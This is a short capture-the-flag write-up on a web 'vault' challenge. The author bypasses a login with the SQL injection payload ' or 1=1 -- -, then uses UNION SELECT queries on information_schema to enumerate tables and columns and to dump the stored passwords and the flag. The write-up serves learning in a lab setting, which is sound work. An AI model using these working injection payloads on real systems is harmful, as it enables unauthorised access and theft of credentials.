The challenge was a vault which contains the flag in the database.

The site was vulnerable to sql injection. The code was broken using single quote

![error](Screenshot from 2023-04-17 23-13-23.png)

So we were able to get through the check using the payload `' or 1=1 -- -`

This gave the result:-

![success](Screenshot from 2023-04-17 23-23-08.png)

This gave no information about the users. Then in the page source the information we need was given as html comments. 

![Source_code](Screenshot from 2023-04-17 23-31-49.png)

Here I did `0' union select group_concat(table_name),null from information_schema.tables where table_schema=database() -- -` To get the table name = **users** 

and did  `0' union select group_concat(column_name),null from information_schema.columns where table_name= "users" -- -` to get the column names = **username,password** 

So I used Union attack and the payload was `0' union select group_concat(password),null from users -- -` 

- group_concat()
    
    This sql function us used to concat every row of a given column into a single line.
    

![Flag](Screenshot from 2023-04-17 23-38-38.png)

This gave the flag 

***flag{y0u_ar3_st1ll_a_noob31e}***